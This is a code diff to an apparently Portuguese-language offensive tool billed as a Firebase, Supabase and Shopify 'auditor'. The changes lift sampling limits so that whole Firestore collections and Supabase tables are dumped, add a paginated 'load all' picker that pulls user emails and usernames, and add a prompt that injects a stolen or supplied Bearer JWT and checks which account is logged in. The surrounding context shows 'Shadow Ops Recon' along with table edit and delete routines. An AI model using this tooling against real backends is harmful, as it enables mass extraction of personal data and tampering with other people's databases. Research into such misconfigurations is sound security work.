@@ -324,10 +324,11 @@ class FirebaseAuditor:
         return False
 
     def _display_docs(self, col, docs):
-        sample_t = Table(title=f"Amostra: {col}", box=SIMPLE)
+        sample_t = Table(title=f"DUMP: {col} ({len(docs)} docs)", box=SIMPLE)
         sample_t.add_column("Document ID", style="cyan")
         sample_t.add_column("Data (Snippet)", style="white")
-        for d in docs[:3]:
+        for d in docs:
+            # Firestore data is slightly nested in 'name' and 'fields'
             name = d.get("name", "").split("/")[-1]
             fields = str(d.get("fields", {}))[:100] + "..."
             sample_t.add_row(name, fields)
@@ -1037,6 +1038,26 @@ class ShyyunzAuditor:
                 task = progress.add_task("[bold red]Shadow Ops Recon...", total=len(tables))
                 await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task, brain) for t in tables])
 
+    def _display_table(self, table_name, rows):
+        if not rows: return
+        # Otimização Visual: Limita colunas no terminal para não quebrar o layout
+        all_keys = list(rows[0].keys())
+        display_keys = all_keys[:6] 
+        
+        table = Table(title=f"DUMP: {table_name} ({len(rows)} registros na página)", box=SIMPLE)
+        for key in display_keys:
+            table.add_column(key, style="cyan", no_wrap=True, overflow="ellipsis")
+        
+        if len(all_keys) > 6:
+            table.add_column("...", style="dim")
+
+        for row in rows:
+            display_vals = [str(row.get(k, ""))[:30] for k in display_keys]
+            if len(all_keys) > 6:
+                display_vals.append("...")
+            table.add_row(*display_vals)
+        console.print(table)
+
     async def dump_table(self, table_name):
         """Extrai todos os registros de uma tabela Supabase usando headers de Range."""
         console.print(f"\n[bold magenta][*] Iniciando Dump Completo (Supabase): {table_name}...[/bold magenta]")
@@ -1452,68 +1473,53 @@ async def shopify_routine(shop_url, site_url):
         elif c == "3": await auditor.dump_api_data(f"{shop_url}/products.json")
 
 async def pick_record_paginated(auditor, table_name):
-    """Lógica de seleção de registros com paginação e busca."""
+    """Seleção acumulativa idêntica ao fluxo de leitura (S/N/T)."""
+    all_rows = []
     offset = 0
     limit = 20
-    search_query = ""
+    id_col = None
     
     while True:
-        url = f"{auditor.base_url}{table_name}?select=*"
-        if search_query:
-            if "=" in search_query: url += f"&{search_query}"
-            else: url += f"&or=(email.ilike.*{search_query}*,username.ilike.*{search_query}*,id.ilike.*{search_query}*)"
-        
-        headers = auditor.headers.copy()
-        headers["Range"] = f"{offset}-{offset + limit - 1}"
-        headers["Prefer"] = "count=planned"
-        
+        url = f"{auditor.base_url}{table_name}?select=*&limit={limit}&offset={offset}"
         async with httpx.AsyncClient(timeout=15.0, verify=False) as cl:
             try:
-                r = await cl.get(url, headers=headers)
-                if r.status_code not in [200, 206]:
-                    console.print(f"[red][!] Erro ao carregar dados: {r.text[:200]}[/red]")
-                    return None
+                r = await cl.get(url, headers=auditor.headers)
+                if r.status_code not in [200, 206]: break
                 rows = r.json()
-            except Exception as e:
-                console.print(f"[red][!] Conexão falhou: {e}[/red]")
-                return None
-        
-        if not rows:
-            console.print("[yellow][!] Nenhum registro encontrado nesta página/filtro.[/yellow]")
-            if offset > 0 or search_query:
-                opt = input("\n[0] Voltar  [F] Limpar Filtro: ").strip().upper()
-                if opt == "0": return None
-                if opt == "F": search_query = ""; offset = 0; continue
-            return None
+                if not rows: break
+                all_rows.extend(rows)
+            except: break
+            
+        if not id_col:
+            for cn in ["id", "uuid", "key", "uid", "id_primary"]:
+                if cn in all_rows[0]: id_col = cn; break
+            if not id_col: id_col = list(all_rows[0].keys())[0]
 
-        # Auto-descobre ID
-        id_col = None
-        for cn in ["id", "uuid", "key", "uid", "id_primary", "slug"]:
-            if cn in rows[0]: id_col = cn; break
-        if not id_col: id_col = list(rows[0].keys())[0]
-
-        console.print(f"\n[bold yellow]--- Seleção: {table_name} (Pag: {offset//limit + 1}) ---[/bold yellow]")
-        if search_query: console.print(f"[dim]Filtro ativo: {search_query}[/dim]")
-        
-        for ri, row in enumerate(rows, 1):
+        # EXIBIÇÃO ACUMULATIVA (S/N/T)
+        console.print(f"\n[bold yellow]--- Seleção: {table_name} ({len(all_rows)} carregados) ---[/bold yellow]")
+        # Mostra apenas o bloco novo para não poluir
+        for ri, row in enumerate(all_rows[offset:], offset + 1):
             val = row.get(id_col, "?")
-            # Tenta pegar um campo extra para facilitar a identificação
-            extra = next((v for k,v in row.items() if k.lower() in ["email", "username", "name", "login"] and v), "")
+            extra = next((v for k,v in row.items() if k.lower() in ["email", "username", "name"] and v), "")
             console.print(f"  [cyan][{ri}][/cyan] [bold]{val}[/bold] [dim]({str(extra)[:50]})[/dim]")
         
-        console.print(f"\n[white][N] Próxima Pag    [A] Pag Anterior    [F] Buscar/Filtrar[/white]")
-        console.print(f"[white][0] Cancelar       [Número] Selecionar[/white]")
+        offset += len(rows)
         
-        choice = input("\n[SHY_PICK] Escolha: ").strip().upper()
-        if choice == "0": return None
-        if choice == "N": offset += limit; continue
-        if choice == "A": offset = max(0, offset - limit); continue
-        if choice == "F":
-            search_query = input("[?] Digite o termo de busca (ou coluna=valor): ").strip()
-            offset = 0; continue
+        # A pergunta idêntica ao DUMP [1]
+        msg = f"\n[?] Exibir mais {limit} registros? (S/N/T para todos / Ou o número para selecionar): "
+        choice = input(msg).strip().upper()
         
-        if choice.isdigit() and 1 <= int(choice) <= len(rows):
-            return rows[int(choice)-1], id_col
+        if choice == "N": return None
+        if choice == "S": continue
+        if choice == "T": limit = 500; continue
+        if choice.isdigit():
+            idx = int(choice)
+            if 1 <= idx <= len(all_rows):
+                return all_rows[idx-1], id_col
+        
+        # Se clicar ENTER ou algo inválido, assume que quer ver mais? Não, vamos ser seguros.
+        if not choice: continue
+    return None
         
 async def edit_table_routine(auditor, tabela):
     console.print(f"\n[bold cyan]--- EDITAR: '{tabela}' ---[/bold cyan]")
@@ -1678,6 +1684,18 @@ async def supabase_routine(target, apikey, site_url, bearer_token=None):
             if idx in table_map:
                 tabela = table_map[idx]['name']
                 await delete_table_routine(auditor, tabela)
+        elif c == "S":
+            jwt = input("\n[🔑] Digite o Bearer Token (JWT): ").strip()
+            if jwt:
+                auditor.bearer = jwt
+                auditor.headers.update({"Authorization": f"Bearer {jwt}"})
+                console.print("[bold green][+] Bearer Token configurado com sucesso![/bold green]")
+                # Re-verifica admin status com o novo token
+                async with httpx.AsyncClient() as cl:
+                    r = await cl.get(f"{auditor.auth_url}user", headers=auditor.headers)
+                    if r.status_code == 200:
+                        console.print(f"[bold green][!] LOGADO: {r.json().get('email', 'Usuário')}[/bold green]")
+                    else: console.print(f"[dim][-] Status do Token: {r.status_code}[/dim]")
         elif c == "K":
             opt = input("[1] Ver Memória  [2] Trocar Gemini Key  [3] Limpar Memória: ").strip()
             if opt == "1": console.print(Panel(json.dumps(knowledge.data, indent=2)))
